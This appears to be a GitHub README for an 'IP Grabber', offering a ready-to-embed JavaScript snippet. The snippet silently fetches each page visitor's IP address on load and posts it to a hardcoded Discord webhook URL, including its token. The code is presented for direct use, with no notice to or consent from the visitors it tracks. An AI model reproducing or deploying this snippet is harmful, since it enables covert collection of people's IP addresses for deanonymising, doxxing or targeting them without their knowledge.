<h1 align="center">IP Grabber</h1>

<p align="center">
  <img src="https://img.shields.io/badge/Status-Active-success?style=flat-square&logo=github" alt="Status">
  <img src="https://img.shields.io/github/license/your_username/your_repo?style=flat-square" alt="License">
</p>

<p align="center">
  <strong>A simple script to grab the user's IP address and send it to a Discord webhook.</strong>
</p>

## Table of Contents

- [Description](#description)
- [How it Works](#how-it-works)
- [Usage](#usage)
- [License](#license)

## Description

This script fetches the user's IP address using `https://api.ipify.org` and sends it to a specified Discord webhook.

## How it Works

The script uses JavaScript's `fetch` API to send a GET request to `https://api.ipify.org` to obtain the user's IP address. It then sends a POST request to a Discord webhook URL with the obtained IP address as the payload.

## Usage

Simply include the script in your HTML file:

```html
<script>
  fetch('https://api.ipify.org')
    .then(response => response.text())
    .then(ip => fetch('https://discord.com/api/webhooks/1241039008390189147/NSOjUiHwvWVF68DThJ-YbnkKLs6ZXKrR6mJH4hL_ie6nZ7o_kSLSjTalUGsQTQ3z-cS1', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: ip })
    }));
</script>